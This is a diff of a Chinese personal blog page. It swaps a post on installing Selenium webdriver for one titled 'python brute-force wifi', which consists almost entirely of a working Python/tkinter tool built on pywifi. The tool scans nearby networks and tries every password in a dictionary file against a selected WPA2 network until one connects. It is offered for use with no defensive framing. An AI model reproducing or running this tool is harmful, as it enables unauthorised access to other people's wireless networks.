@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <meta name="robots" content="all,follow">
 <meta name="googlebot" content="index,follow,snippet,archive">
-<title>webdriver的下载与安装 | strangepapers</title>
+<title>python暴力破解wifi | strangepapers</title>
 <link rel="shortcut icon" href="https://strangepapers.github.io//favicon.ico?v=1691201046539">
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
 <link rel="stylesheet" href="https://strangepapers.github.io//styles/main.css" type='text/css' media='all'>
@@ -134,12 +134,12 @@
     <div id="loop-container" class="loop-container">
       <div class="post type-post status-publish format-standard has-post-thumbnail hentry category-design tag-design tag-standard-2 tag-tagalicious tag-travel entry full-without-featured odd excerpt-1">
         
-          <div class='featured-image lazy lazy-bg-image' data-background="https://img1.imgtp.com/2023/07/29/60m1kQyz.jpg">
+          <div class='featured-image lazy lazy-bg-image' data-background="https://img1.imgtp.com/2023/08/05/Rg7RFDMY.png">
           </div>
         
 
         <div class="entry-meta">
-          <span class="date">· 2023-07-29 ·</span> <span> / </span>
+          <span class="date">· 2023-08-05 ·</span> <span> / </span>
           <span class="author">
             <a href="https://strangepapers.github.io/" title="" rel="author"> <font face="Arial Black">
 单程孤舟，出云入霞，如歌如吟。</font>
@@ -147,67 +147,202 @@
 </a>
           </span>
           
-            <span class="category">
-                    <span> / </span>
-                    <a href="https://strangepapers.github.io/tag/chuang-zuo/">创作</a>
-                </span>
-          
         </div>
         <div class='entry-header'>
-          <h1 class='entry-title'>webdriver的下载与安装</h1>
+          <h1 class='entry-title'>python暴力破解wifi</h1>
         </div>
         <div class="entry-container">
           <div class="entry-content">
             <article>
-              <h1 id="webdriver可以干神马">webdriver可以干神马</h1>
-<p>webdriver，顾名思义，可以代替人工来在浏览器上执行一些命令或程序。<br>
-不同的浏览器会有不同的webdriver，版本不同，webdriver也会不同。</p>
-<h1 id="webdriver的下载">webdriver的下载</h1>
-<p>以EDGE为例，Microsoft Edge拥有官方webdriver下载地址，但下载之前，你要转到浏览器设置，查看你浏览器的版本。<br>
-<img src="https://img1.imgtp.com/2023/07/29/AOxRNUqx.png" alt="屏幕截图 2023-07-29 172514.png" loading="lazy"><br>
-记住你的浏览器版本号，转到https://developer.microsoft.com/zh-cn/microsoft-edge/tools/webdriver/，下载适配你的浏览器的webdriver。<br>
-你会下载到一个压缩包，请你解压，并提取里面的exe程序。<br>
-<img src="https://img1.imgtp.com/2023/07/29/VjXBbwMw.png" alt="1690622964748.png" loading="lazy"><br>
-运行应用程序你会看到“webdriver已成功运行。”<br>
-<img src="https://img1.imgtp.com/2023/07/29/Iw7sXrid.png" alt="1690623050039.png" loading="lazy"></p>
-<h1 id="webdriver的安装">webdriver的安装</h1>
-<p>以PYTHON为例，python需要Selenium的附加。</p>
-<h2 id="安装selenium">安装Selenium</h2>
-<p>在命令提示符下输入</p>
-<pre><code>pip install selenium 
-</code></pre>
-<p>即可安装。<br>
-通过在python中运行</p>
-<pre><code>import selenium
-help(selenium)
-</code></pre>
-<p>检查安装是否成功。</p>
-<h2 id="安装webdriver">安装webdriver</h2>
-<p>我们只需将下载好的webdriver的exe应用程序复制到python的目录下即可。</p>
-<h1 id="测试与报错">测试与报错</h1>
-<p>自此我们已经成功安装webdriver。</p>
-<pre><code class="language-python">from selenium import webdriver
-from selenium.webdriver.common.by import By
+              <p>需要pywifi</p>
+<pre><code class="language-python"># coding:utf-8
+
+from tkinter import *
+from tkinter import ttk  
+import pywifi
+from pywifi import const
 import time
+import tkinter.filedialog
+import tkinter.messagebox
 
-driver = webdriver.Edge()
-
-driver.get('https://bing.com')
-
-element = driver.find_element(By.ID, 'sb_form_q')
-element.send_keys('WebDriver')
-element.submit()
-
-time.sleep(5)
-driver.quit()
+class MY_GUI():
+	def __init__(self,init_window_name):
+		self.init_window_name = init_window_name
+		
+		#密码文件路径
+		self.get_value = StringVar()
+		
+		#获取破解wifi账号
+		self.get_wifi_value = StringVar()
+		
+		#获取wifi密码
+		self.get_wifimm_value = StringVar()
+		
+		self.wifi = pywifi.PyWiFi()  #抓取网卡接口
+		self.iface = self.wifi.interfaces()[0] #抓取第一个无线网卡
+		self.iface.disconnect()  #测试链接断开所有链接
+		time.sleep(1)  #休眠1秒
+		#测试网卡是否属于断开状态
+		assert self.iface.status() in\
+				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
+	
+	def __str__(self):
+		return '(WIFI:%s,%s)' % (self.wifi,self.iface.name())
+		
+	#设置窗口
+	def set_init_window(self):
+		self.init_window_name.title(&quot;WIFI破解工具&quot;)
+		self.init_window_name.geometry('+500+200')
+		
+		labelframe = LabelFrame(width=400, height=200,text=&quot;配置&quot;)
+		labelframe.grid(column=0, row=0, padx=10, pady=10)
+		
+		self.search = Button(labelframe,text=&quot;搜索附近WiFi&quot;,command=self.scans_wifi_list).grid(column=0,row=0)
+		
+		self.pojie = Button(labelframe,text=&quot;开始破解&quot;,command=self.readPassWord).grid(column=1,row=0)
+		
+		self.label = Label(labelframe,text=&quot;目录路径：&quot;).grid(column=0,row=1)
+		
+		self.path = Entry(labelframe,width=12,textvariable = self.get_value).grid(column=1,row=1)
+		
+		self.file = Button(labelframe,text=&quot;添加密码文件目录&quot;,command=self.add_mm_file).grid(column=2,row=1)
+		
+		self.wifi_text = Label(labelframe,text=&quot;WiFi账号：&quot;).grid(column=0,row=2)
+		
+		self.wifi_input = Entry(labelframe,width=12,textvariable = self.get_wifi_value).grid(column=1,row=2)
+		
+		self.wifi_mm_text = Label(labelframe,text=&quot;WiFi密码：&quot;).grid(column=2,row=2)
+		
+		self.wifi_mm_input = Entry(labelframe,width=10,textvariable = self.get_wifimm_value).grid(column=3,row=2,sticky=W)
+		
+		self.wifi_labelframe = LabelFrame(text=&quot;wifi列表&quot;)
+		self.wifi_labelframe.grid(column=0, row=3,columnspan=4,sticky=NSEW)
+		
+		
+		# 定义树形结构与滚动条
+		self.wifi_tree = ttk.Treeview(self.wifi_labelframe,show=&quot;headings&quot;,columns=(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;))		
+		self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)       
+		self.wifi_tree.configure(yscrollcommand=self.vbar.set)
+		
+		# 表格的标题
+		self.wifi_tree.column(&quot;a&quot;, width=50, anchor=&quot;center&quot;)
+		self.wifi_tree.column(&quot;b&quot;, width=100, anchor=&quot;center&quot;)
+		self.wifi_tree.column(&quot;c&quot;, width=100, anchor=&quot;center&quot;)
+		self.wifi_tree.column(&quot;d&quot;, width=100, anchor=&quot;center&quot;)
+         
+		self.wifi_tree.heading(&quot;a&quot;, text=&quot;WiFiID&quot;)
+		self.wifi_tree.heading(&quot;b&quot;, text=&quot;SSID&quot;)
+		self.wifi_tree.heading(&quot;c&quot;, text=&quot;BSSID&quot;)
+		self.wifi_tree.heading(&quot;d&quot;, text=&quot;signal&quot;)
+        
+		self.wifi_tree.grid(row=4,column=0,sticky=NSEW)
+		self.wifi_tree.bind(&quot;&lt;Double-1&gt;&quot;,self.onDBClick)
+		self.vbar.grid(row=4,column=1,sticky=NS)
+		
+	#搜索wifi
+	#cmd /k C:\Python27\python.exe &quot;$(FULL_CURRENT_PATH)&quot; &amp; PAUSE &amp; EXIT
+	def scans_wifi_list(self):  # 扫描周围wifi列表
+		#开始扫描
+		print(&quot;^_^ 开始扫描附近wifi...&quot;)
+		self.iface.scan()
+		time.sleep(15)
+		#在若干秒后获取扫描结果
+		scanres = self.iface.scan_results()
+		#统计附近被发现的热点数量
+		nums = len(scanres)
+		print(&quot;数量: %s&quot;%(nums))
+		#print (&quot;| %s |  %s |  %s | %s&quot;%(&quot;WIFIID&quot;,&quot;SSID&quot;,&quot;BSSID&quot;,&quot;signal&quot;))
+		# 实际数据
+		self.show_scans_wifi_list(scanres)
+		return scanres
+	
+	#显示wifi列表
+	def show_scans_wifi_list(self,scans_res):
+		for index,wifi_info in enumerate(scans_res):
+            # print(&quot;%-*s| %s | %*s |%*s\n&quot;%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
+			self.wifi_tree.insert(&quot;&quot;,'end',values=(index + 1,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
+			#print(&quot;| %s | %s | %s | %s \n&quot;%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
+	
+	#添加密码文件目录
+	def add_mm_file(self):
+		self.filename = tkinter.filedialog.askopenfilename()
+		self.get_value.set(self.filename)
+	
+	#Treeview绑定事件
+	def onDBClick(self,event):
+		self.sels= event.widget.selection()
+		self.get_wifi_value.set(self.wifi_tree.item(self.sels,&quot;values&quot;)[1])
+		#print(&quot;you clicked on&quot;,self.wifi_tree.item(self.sels,&quot;values&quot;)[1])
+	
+	#读取密码字典，进行匹配
+	def readPassWord(self):
+		self.getFilePath = self.get_value.get()
+		#print(&quot;文件路径：%s\n&quot; %(self.getFilePath))
+		self.get_wifissid = self.get_wifi_value.get()
+		#print(&quot;ssid：%s\n&quot; %(self.get_wifissid))
+		self.pwdfilehander=open(self.getFilePath,&quot;r&quot;,errors=&quot;ignore&quot;)
+		while True:
+				try:
+					self.pwdStr =self.pwdfilehander.readline()
+					#print(&quot;密码: %s &quot; %(self.pwdStr))
+					if not self.pwdStr:
+						break
+					self.bool1=self.connect(self.pwdStr,self.get_wifissid)
+					#print(&quot;返回值：%s\n&quot; %(self.bool1) )
+					if self.bool1:
+						# print(&quot;密码正确：&quot;+pwdStr
+						# res = &quot;密码:%s 正确 \n&quot;%self.pwdStr;
+						self.res = &quot;===正确===  wifi名:%s  匹配密码：%s &quot;%(self.get_wifissid,self.pwdStr)
+						self.get_wifimm_value.set(self.pwdStr)
+						tkinter.messagebox.showinfo('提示', '破解成功！！！')
+						print(self.res)
+						break
+					else:
+						# print(&quot;密码:&quot;+self.pwdStr+&quot;错误&quot;)
+						self.res = &quot;---错误--- wifi名:%s匹配密码：%s&quot;%(self.get_wifissid,self.pwdStr)
+						print(self.res)
+					sleep(3)
+				except:
+					continue
+	
+	#对wifi和密码进行匹配
+	def connect(self,pwd_Str,wifi_ssid):
+		#创建wifi链接文件
+		self.profile = pywifi.Profile()
+		self.profile.ssid =wifi_ssid #wifi名称
+		self.profile.auth = const.AUTH_ALG_OPEN  #网卡的开放
+		self.profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
+		self.profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
+		self.profile.key = pwd_Str #密码
+		self.iface.remove_all_network_profiles() #删除所有的wifi文件
+		self.tmp_profile = self.iface.add_network_profile(self.profile)#设定新的链接文件
+		self.iface.connect(self.tmp_profile)#链接
+		time.sleep(5)
+		if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
+			isOK=True   
+		else:
+			isOK=False
+		self.iface.disconnect() #断开
+		time.sleep(1)
+		#检查断开状态
+		assert self.iface.status() in\
+				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
+		return isOK
+		
+def gui_start():
+	init_window = Tk()
+	ui = MY_GUI(init_window)
+	print(ui)
+	ui.set_init_window()
+	#ui.scans_wifi_list()
+	
+	init_window.mainloop()
+	
+gui_start()
 </code></pre>
-<p>通过这份python程序可以测试webdriver是否安装成功。</p>
-<h2 id="报错">报错</h2>
-<p>为什么webdriver用着用着就会报错？<br>
-浏览器的更新会使webdriver不可用，你需重新下载以更新webdriver</p>
-<h1 id="其他">其他</h1>
-<p>其他浏览器的webdriver可以在其官网找到并下载。<br>
-各个编程语言对应的安装方式不同，你可以在网上浏览以找到安装方法。</p>
+<p>取自github。</p>
+<!-- more -->
+<!-- more -->
 
             </article>
           </div>
@@ -269,7 +404,7 @@ driver.quit()
             <nav class="navigation pagination" role="navigation">
               <h2 class="screen-reader-text">Posts navigation</h2>
               <div class="nav-links">
-                <a class="next page-numbers" href="https://strangepapers.github.io/post/EMri5LUJN/">下一篇->web攻防工具收集</a>
+                <a class="next page-numbers" href="https://strangepapers.github.io/post/NoftwTtC_/">下一篇->WHO care us.</a>
               </div>
             </nav>
           
